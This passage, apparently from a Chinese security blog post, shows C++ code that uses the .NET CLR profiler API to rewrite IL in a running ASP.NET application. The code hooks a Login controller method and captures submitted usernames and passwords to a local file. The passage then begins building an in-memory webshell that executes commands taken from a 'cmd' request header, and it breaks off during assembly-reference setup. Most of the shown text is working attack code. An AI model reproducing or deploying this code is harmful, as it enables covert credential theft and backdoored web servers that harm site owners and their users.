        PCCOR_SIGNATURE signatureBlob;
        ULONG signatureBlobLength;
        DWORD methodAttributes = 0;
        IfFailRet(metaDataImport->GetMethodProps(token1, &classTypeDef, functionName, MAX_LENGTH, 0, &methodAttributes, &signatureBlob, &signatureBlobLength, NULL, NULL));
        IfFailRet(metaDataImport->GetTypeDefProps(classTypeDef, className, MAX_LENGTH, 0, NULL, NULL));
        metaDataImport->Release();
        WCHAR wcs[MAX_LENGTH * 2];
        wcscpy(wcs, className);
        wcscat(wcs, L".");
        wcscat(wcs, functionName);
        if (wcscmp(L"WebApplication1.Controllers.HelloController.Login", wcs) == 0) {
            return RewriteIL(this->corProfilerInfo, nullptr, moduleId, token, functionId, reinterpret_cast(EnterMethodAddress), reinterpret_cast(LeaveMethodAddress), enterLeaveMethodSignatureToken);
        }
        else {
            return S_OK;
        }
    }
函数刚开始的时候通过GetFunctionInfo函数获取到了对应的ModuleID，并通过CheckProcessName函数进行验证。
    bool CheckProcessName(ICorProfilerInfo7* corProfilerInfo, ModuleID moduleId) {
        const int MAX_LENGTH = 1024;
        WCHAR moduleName[MAX_LENGTH];
        AssemblyID assemblyID;
        AppDomainID appId;
        ULONG buffSize = 0;
        ProcessID processId;
        char szOutBuf[MAX_PATH] = { 0 };
        GetEnvironmentVariable(_T("GODWIND_PROFILER_PROCESSES"), szOutBuf, MAX_PATH - 1);
        WCHAR processName[MAX_LENGTH];
        mbstowcs(processName, szOutBuf, sizeof(szOutBuf) - 1);      //char to wchar_t
        Check(corProfilerInfo->GetModuleInfo(moduleId, NULL, MAX_LENGTH, 0, moduleName, &assemblyID));
        WCHAR assemblyName[MAX_LENGTH];
        Check(corProfilerInfo->GetAssemblyInfo(assemblyID, MAX_LENGTH, 0, assemblyName, &appId, NULL));
        Check(corProfilerInfo->GetAppDomainInfo(appId, 0, &buffSize, NULL, NULL));
        WCHAR szName[MAX_LENGTH];
        Check(corProfilerInfo->GetAppDomainInfo(appId, buffSize, &buffSize, szName, &processId));
        if(wcscmp(szName, processName) == 0){
            return true;
        }
        else {
            return false;
        }
    }
该函数的具体内容就是获取系统环境变量GODWIND_PROFILER_PROCESSES的值，并通过GetAppDomainInfo返回的szName目标程序进程名和GODWIND_PROFILER_PROCESSES的值比较。如果相等就执行之后的步骤，否则就返回S_OK标志。  
再往之后看：
    mdTypeDef classTypeDef;
    WCHAR functionName[MAX_LENGTH];
    WCHAR className[MAX_LENGTH];
    PCCOR_SIGNATURE signatureBlob;
    ULONG signatureBlobLength;
    DWORD methodAttributes = 0;
    IfFailRet(metaDataImport->GetMethodProps(token1, &classTypeDef, functionName, MAX_LENGTH, 0, &methodAttributes, &signatureBlob, &signatureBlobLength, NULL, NULL));
    IfFailRet(metaDataImport->GetTypeDefProps(classTypeDef, className, MAX_LENGTH, 0, NULL, NULL));
    metaDataImport->Release();
    WCHAR wcs[MAX_LENGTH * 2];
    wcscpy(wcs, className);
    wcscat(wcs, L".");
    wcscat(wcs, functionName);
    if (wcscmp(L"WebApplication1.Controllers.HelloController.Login", wcs) == 0) {
        return RewriteIL(this->corProfilerInfo, nullptr, moduleId, token, functionId, reinterpret_cast(EnterMethodAddress), reinterpret_cast(LeaveMethodAddress), enterLeaveMethodSignatureToken);
    }
    else {
        return S_OK;
    }
之前说到过GetMethodProps这种方式可以获取当前JIT加载的函数的名称和对应的类名，我这里讲两个字符串拼接完成之后与L”WebApplication1.Controllers.HelloController.Login”比较。
如果相等，就说明当前的functionID对应的就是我们需要织入的WebApplication1.Controllers.HelloController.Login函数。
然后带入到RewriteIL函数中进行IL字节码操作，这里织入的对象是我自己写的一个函数。
    static void STDMETHODCALLTYPE Leave(char* arg0)
    {
        FILE *fp = NULL;
        fp = fopen("E:\\GetRequstInfo.txt", "a+");
        fprintf(fp, "\r\narg0: %s  \r\n", arg0);
        fclose(fp);
    }
    COR_SIGNATURE enterLeaveMethodSignature[] = { IMAGE_CEE_CS_CALLCONV_STDCALL, 0x01, ELEMENT_TYPE_VOID, ELEMENT_TYPE_STRING };
    void(STDMETHODCALLTYPE *LeaveMethodAddress)(char*) = &Leave;
这里我需要重点说一下enterLeaveMethodSignature数组，这个数组是对你织入的函数的描述，在之后的织入中必不可少
第一个值是他的调用方式stdcall  
第二个值代表他有多少个参数，这里只有一个char* arg0参数，所以数值是1  
第三个值代表返回void类型  
第四个值就是参数类型，这里是String的类型，如果第二个值是2，则数组的第五个值也得写上对应的参数类型，但是我们没有两个参数，因此数组只有四个值。
最后通过IMetaDataEmit::GetTokenFromSig函数获取对应元数据签名
关于数组里的这些值该如何设置，可以从微软的官网上找到：
因此之后带入RewriteIL中的LeaveMethodAddress就是我要织入的函数，跟进函数查看：
    HRESULT RewriteIL(
        ICorProfilerInfo * pICorProfilerInfo,
        ICorProfilerFunctionControl * pICorProfilerFunctionControl,
        ModuleID moduleID,
        mdMethodDef methodDef,
        FunctionID functionId,
        UINT_PTR enterMethodAddress,
        UINT_PTR exitMethodAddress,
        ULONG32 methodSignature)
    {
        ILRewriter rewriter(pICorProfilerInfo, pICorProfilerFunctionControl, moduleID, methodDef);
        IMetaDataImport* metaDataImport = NULL;
        mdToken token1 = NULL;
        IfFailRet(pICorProfilerInfo->GetTokenAndMetaDataFromFunction(functionId, IID_IMetaDataImport, (LPUNKNOWN *)&metaDataImport, &token1));
        IfFailRet(rewriter.Import());
        {
            IfFailRet(AddExitProbe(metaDataImport, &rewriter, functionId, exitMethodAddress, methodSignature));
        }
        IfFailRet(rewriter.Export());
        return S_OK;
    }
获取到对应的metaDataImport对象后，带入到AddExitProbe函数，之后就是操作IL织入代码的地方，在这之前先来看看我们要织入的程序代码是什么样子的。  
源C#代码：
中间语言IL代码：
所以我织入的思路就是在IL_0016和IL_0017之间织入如下代码：
    ldloc.0
    ldc.i4 num        //function address
    calli
    nop
如此一来，刚才IL_0016上的stloc.0的返回值继续压栈成参数并调用我们的函数，就能够完成我们获取目标传参的内容，所以之前的AddExitProbe函数的实现如下：
    HRESULT AddExitProbe(
        IMetaDataImport* metaDataImport,
        ILRewriter * pilr,
        FunctionID functionId,
        UINT_PTR methodAddress,
        ULONG32 methodSignature)
    {
        HRESULT hr;
        BOOL fAtLeastOneProbeAdded = FALSE;
        // Find all RETs, and insert a call to the exit probe before each one.
        for (ILInstr * pInstr = pilr->GetILList()->m_pNext; pInstr != pilr->GetILList(); pInstr = pInstr->m_pNext)
        {
            switch (pInstr->m_opcode)
            {
            case CEE_CALLVIRT:{
                const int MAX_LENGTH = 1024;
                WCHAR szString[MAX_LENGTH];
                ULONG *pchString = 0;
                if (pInstr->m_Arg64 == 167772219) {     //0xa00003b     string [System]System.Collections.Specialized.NameValueCollection::get_Item(string)
                    IfFailRet(metaDataImport->GetUserString((mdString)pInstr->m_pPrev->m_Arg64, szString, MAX_LENGTH, pchString));
                    pInstr = pInstr->m_pNext;
                    pilr->GetILList();
                    pInstr = pInstr->m_pNext;
                    pilr->GetILList();
                    ILInstr * pNewInstr = pilr->NewILInstr();
                    pNewInstr = pilr->NewILInstr();
                    if(wcsstr(szString,L"username")){
                        pNewInstr->m_opcode = CEE_LDLOC_0;        //ldloc.0
                    }
                    else if (wcsstr(szString, L"password")) {
                        pNewInstr->m_opcode = CEE_LDLOC_1;        //ldloc.1
                    }
                    else {
                        return S_OK;
                    }
                    pilr->InsertBefore(pInstr, pNewInstr);
                    constexpr auto CEE_LDC_I = sizeof(size_t) == 8 ? CEE_LDC_I8 : sizeof(size_t) == 4 ? CEE_LDC_I4 : throw std::logic_error("size_t must be defined as 8 or 4");
                    pNewInstr = pilr->NewILInstr();
                    pNewInstr->m_opcode = CEE_LDC_I;        //push function address
                    pNewInstr->m_Arg64 = methodAddress;
                    pilr->InsertBefore(pInstr, pNewInstr);
                    pNewInstr = pilr->NewILInstr();
                    pNewInstr->m_opcode = CEE_CALLI;        //calli
                    pNewInstr->m_Arg32 = methodSignature;
                    pilr->InsertBefore(pInstr, pNewInstr);
                    pNewInstr = pilr->NewILInstr();
                    pNewInstr->m_opcode = CEE_NOP;        //nop
                    pilr->InsertBefore(pInstr, pNewInstr);
                    fAtLeastOneProbeAdded = TRUE;
                }
                break;
            }
            default:
                break;
            }
        }
        if (!fAtLeastOneProbeAdded)
            return E_FAIL;
        return S_OK;
    }
其中pInstr->m_Arg64 == 167772219的167772219值是提前遍历过一遍才知道该函数对应的MethodToken。  
同时，因为我是要织入在IL_0017前面，这个指针相当于我switch-case中设定的callvirt的偏移后两个节点，因此需要在代码中调用两次pInstr = pInstr->m_pNext;
## 针对ASP.NET MVC的内存马编写
编写内存马的时候爬坑也挺久的，请教了公司研发部的同事，最后经过多次调试之后总算把demo做出来了。因为国内外针对这方面的文档确实很少，之能靠自己一步步调试和定位错误原因，不过好在最终还是达到了预期的目标。
源代码还是跟获取账号密码的代码一样，这次我直接织入到一个Controller的方法中，并获取Headers头的cmd参数，执行命令之后返回到Response上。
首先第一件事就是获取所需要调用的函数的程序集引用
    ASSEMBLYMETADATA assemblyMetadata = { 0 };
        assemblyMetadata.usMajorVersion = 4;
        assemblyMetadata.usMinorVersion = 0;
        assemblyMetadata.usBuildNumber = 0;
        assemblyMetadata.usRevisionNumber = 0;
        BYTE WebpublicKey[] = { 0xb0, 0x3f, 0x5f, 0x7f, 0x11, 0xd5, 0x0a, 0x3a };      //b03f5f7f11d50a3a